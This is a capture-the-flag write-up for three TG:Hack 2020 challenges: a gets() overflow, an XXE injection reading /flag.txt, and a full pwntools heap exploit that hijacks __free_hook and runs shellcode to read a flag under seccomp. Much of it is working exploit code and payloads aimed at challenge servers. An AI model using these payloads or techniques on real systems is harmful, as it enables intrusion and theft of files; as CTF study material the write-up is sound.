# TG:Hack2020
> 20200411-20200412

## Boofy
### Description

> Author: [**Ingeborg Ytrehus - ingeborg_y#6548**](https://tghack.no/authors#16)
>
> This program looks like it's password protected, but we can't seem to find the correct password.
>
> ```
> nc boofy.tghack.no 6003
> ```
>
> or use a mirror closer to you:
>
> - `nc us.boofy.tghack.no 6003` (US)
> - `nc asia.boofy.tghack.no 6003` (Japan)
>
> files:
>
> - [download binary](https://storage.googleapis.com/tghack-public/2020/f93e424b7f8ce060b0c00dc135269128/boofy)
> - [download source](https://storage.googleapis.com/tghack-public/2020/f93e424b7f8ce060b0c00dc135269128/boofy.c)

### Analysis

It's a really easy task. The codes `gets(password)` will overflow the buffer and we can get flag by overwrite `correct` to `\x01`.

```c
void try_password(){
	char password[20] = { 0 };
	int correct = 0;	
	printf("Please enter the password?\n");
	gets(password);
	if (correct == 1) {
		get_flag();
	} else {
		printf("Sorry, but that's not the right password...\n");
	}
}
```

### Solution

```python
offset = 21
payload = '\x01'*offset
sl(payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/TG:HACK2020/pwn/boofy) 



## Extract this!
### Description

> Extract This!
>
> Author: Einar Antonsen - Chabz#1587
>
> One of our agents managed to install a service on MOTHER's network. We can use it to extract secrets, but she didn't tell me how! Can you figure it out?
>
> ```
> nc extract.tghack.no 6000
> ```
>

### Analysis

It's a xml language parser, so try to [XEE(**X**ML **E**xternal **E**ntity)](https://en.wikipedia.org/wiki/XML_external_entity_attack) Injection.

### Solution

```xml
<?xml version="1.0" encoding="UTF-8" ?> <!DOCTYPE ANY [<!ENTITY xxe SYSTEM "/flag.txt" >]><value>&xxe;</value>
```

>  Is it a really pwn instead of web challenges?



## crap 

so difficult...

I success in local but fail in remote...

### seccomp rules

```nasm
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0f 0xffffffff  if (A != 0xffffffff) goto 0020
 0005: 0x15 0x0d 0x00 0x00000002  if (A == open) goto 0019
 0006: 0x15 0x0c 0x00 0x00000003  if (A == close) goto 0019
 0007: 0x15 0x0b 0x00 0x0000000a  if (A == mprotect) goto 0019
 0008: 0x15 0x0a 0x00 0x000000e7  if (A == exit_group) goto 0019
 0009: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0014
 0010: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # read(fd, buf, count)
 0011: 0x15 0x00 0x08 0x00000000  if (A != 0x0) goto 0020
 0012: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
 0013: 0x15 0x05 0x06 0x00000000  if (A == 0x0) goto 0019 else goto 0020
 0014: 0x15 0x00 0x05 0x00000001  if (A != write) goto 0020
 0015: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # write(fd, buf, count)
 0016: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0020
 0017: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
 0018: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x06 0x00 0x00 0x00000000  return KILL

```

### Solution

!> Note: Only works in local (Ubuntu 19.04 & libc 2.29)

leak `main_arean` by printing `feedback` after free 

leak the base of `text` by searching the value of text base address in library `ld` .

> the offset between libc and ld does not change (in local)
>
> but the offset in local is different from it in remote

overwrite `write_count`,`read_count` to negative number and clean `feedback` 

overwrite `__free_hook` so we can control `rip` after `feedback` was freed

put `ropchain` and `shellcode` into `feedback` 

trigger rop by overwriting `__free_hook` to  `setcontext` 

call `mprotect` to make `heap` executable

`close(0)` to release `fd0` and open `flag` , `fd0` would be assigned to the flag file

read flag and write it

too lazy to say any more ...

and so poor python exp I was written... 

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './crap'
# local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/libc.so.6'

is_local = False
is_remote = False

# if len(sys.argv) == 1:
#     is_local = True
#     p = process(local_file)
#     libc = ELF(local_libc)
# elif len(sys.argv) > 1:
#     is_remote = True
#     if len(sys.argv) == 3:
#         host = sys.argv[1]
#         port = sys.argv[2]
#     else:
#         host, port = sys.argv[1].split(':')
#     p = remote(host, port)
#     libc = ELF(remote_libc)

# elf = ELF(local_file)

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
          
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('./Pwn', os.F_OK): os.mkdir('./Pwn')
            path = './Pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)

# info

# elf, libc
elf=change_ld('./crap','./lib/ld-linux-x86-64.so.2')
if len(sys.argv)>1:
    is_remote=True
    p = remote('asia.crap.tghack.no','6001')
else:
    is_local=True
    p = elf.process(env={'LD_PRELOAD':'./lib/libc.so.6','LD_LIBRARY_PATH':'lib'})
libc = ELF('./lib/libc.so.6')

# context.log_level = 'debug'
context.arch = 'amd64'

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

# rop1
offset = 0
payload = 'A'*offset
payload += ''

main_arena_off = 0x7f9652abbbe0 - 0x7f9652706000
write_count_off = 0x202034
# debug('b *$reasbe(0xCAD)')

sla('> ','3')
sla('feedback: ','TaQini')
sla('Do you want to keep your feedback? (y/n)\n','n')
# debug('b *$rebase(0x1179)')
sla('> ','4')
ru('feedback: ')
main_arena = uu64(rc(6))
info_addr('main_arena',main_arena)
libcbase = main_arena - main_arena_off
info_addr('libcbase',libcbase)
sla('> ','1')
leak = main_arena + 0x22e900
# leak = main_arena + 0x20
sla('addr: ',hex(leak))
# sla('addr: ',hex(main_arena))
ru('value: ')
text = eval(rc(14))
info_addr('text',text)

main = text + 0x1180
write_count = text+write_count_off
feedback = write_count+4
read_count = write_count-4
info_addr('write_count',write_count)
sla('> ','2')
sla('addr/value: ','%s %s'%(hex(read_count),hex(0xffffffdfffffffdf)))
sla('> ','1')
sla('addr: ',hex(main_arena))
ru('value: ')
bss = eval(rc(14))
info_addr('bss',bss)
sla('> ','2')
sla('addr/value: ','%s %s'%(hex(feedback),hex(0)))

# gadget
prbp = text+0x0000000000000bd0 # pop rbp ; ret
prdi = text+0x0000000000001283 # pop rdi ; ret
prsi = libcbase+0x0000000000022192 # pop rsi ; ret
prdx = libcbase+0x0000000000001b9a # pop rdx ; ret
leave = libcbase+0x0000000000040222 # leave ; ret
ret = libcbase+0x0000000000000280 # ret
syscall = libcbase+0xf0bd5 # syscall
prax = libcbase+0x0000000000038e88 # pop rax ; ret

# func
open = libcbase+libc.sym['open']
read = libcbase+libc.sym['read']
write = libcbase+libc.sym['write']
printf = libcbase+libc.sym['printf']
fgets = libcbase+libc.sym['fgets']
mprotect = libcbase+libc.sym['mprotect']
stderr = libcbase+libc.sym['stderr']
free_hook = libcbase+libc.sym['__free_hook']
setcontext = libcbase+0x45ba5

info_addr('free_hook',free_hook)
info_addr('printf',printf)
# 0x7f7a73e74ba5

sla('> ','2')
sla('addr/value: ','%s %s'%(hex(free_hook),hex(printf)))

buf = bss-0x1260
info_addr('buf',buf)
heap = bss-0x32f0
# open('/flag',0,0x100)
# ropchain = p64(prdi) + p64(buf+0x108) + p64(prsi) + p64(0) + p64(prdx) + p64(0x100) + p64(prax) + p64(2) + p64(syscall)
# mprotect(buf,0x1000,7)
# ropchain += p64(main)
ropchain = p64(prdi) + p64(heap) + p64(prsi) + p64(0x10000) + p64(prdx) + p64(0x7) + p64(mprotect)
ropchain += p64(buf+0x40+8)
ropchain += asm('''
L1:
        /* open(file='/home/crap/flag.txt', oflag=0, mode=256) */\n
        /* push '/home/crap/flag.txt\x00' */\n
        push 0x1010101 ^ 0x747874\n
        xor dword ptr [rsp], 0x1010101\n
        mov rax, 0x2e67616c662f7061\n
        push rax\n
        mov rax, 0x72632f656d6f682f\n
        push rax\n
        mov rdi, rsp\n
        xor edx, edx\n
        mov dh, 0x100 >> 8\n
        xor esi, esi /* 0 */\n
        /* call open() */\n
        push SYS_open /* 2 */\n
        pop rax\n
        syscall\n

        pop rcx\n /* stack balance */
        pop rcx\n /* stack balance */
        pop rcx\n /* stack balance */
        cmp eax,0\n
        jns L1\n

        /* close(fd=0) */\n
        xor edi, edi /* 0 */\n
        /* call close() */\n
        push SYS_close /* 3 */\n
        pop rax\n
        syscall\n

        /* open(file='/home/crap/flag.txt', oflag=0, mode=256) */\n
        /* push '/home/crap/flag.txt\x00' */\n
        push 0x1010101 ^ 0x747874\n
        xor dword ptr [rsp], 0x1010101\n
        mov rax, 0x2e67616c662f7061\n
        push rax\n
        mov rax, 0x72632f656d6f682f\n
        push rax\n
        mov rdi, rsp\n
        xor edx, edx\n
        mov dh, 0x100 >> 8\n
        xor esi, esi /* 0 */\n
        /* call open() */\n
        push SYS_open /* 2 */\n
        pop rax\n
        syscall\n

        push 0\r\n
        pop rdi\n
        mov rsi,%s\n
        push 0x100\n
        pop rdx\n
        push 0x0\n
        pop rcx\n
        push 0\n
        pop rax\n
        syscall\n

        push 1\r\n
        pop rdi\n
        mov rsi,%s\n
        push 0x100\n
        pop rdx\n
        push 0x0\n
        pop rcx\n
        push 1\n
        pop rax\n
        syscall\n

    '''%(buf,buf)
    )

# ropchain += p64(prdi) + p64(feedback) + p64(prsi) + p64(0x100) + p64(prdx) + p64(stderr) + p64(fgets)
 # + p64(0) + p64(syscall)
# ropchain = ropchain.ljust(0x100,'\x90') + '/flag\0\0\0'

sla('> ','3')
sla('feedback: ','%15$p'.ljust(8,'a')+ropchain)
sla('Do you want to keep your feedback? (y/n)\n','n')
stack = eval(rc(14))
retaddr = stack + 8 -280
info_addr('retaddr',retaddr)
# debug('b *$rebase(0x0010DD)')
# debug('')

sla('> ','2')
sla('addr/value: ','%s %s'%(hex(feedback),hex(0)))
sla('> ','2')
sla('addr/value: ','%s %s'%(hex(free_hook),hex(setcontext)))
rsp = libcbase+0x3b5aa4
rcx = libcbase+0x3b5aac
sla('> ','2')
sla('addr/value: ','%s %s'%(hex(rsp),hex(buf)))

sla('> ','2')
sla('addr/value: ','%s %s'%(hex(rcx),hex(prdi)))

sla('> ','3')
sla('feedback: ',p64(0xdeadbeef)*10)
# debug('b free')
sla('Do you want to keep your feedback? (y/n)\n','n')
# sla('> ','2')
# sla('addr/value: ','%s %s'%(hex(retaddr),hex(read)))

print rc()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()

```

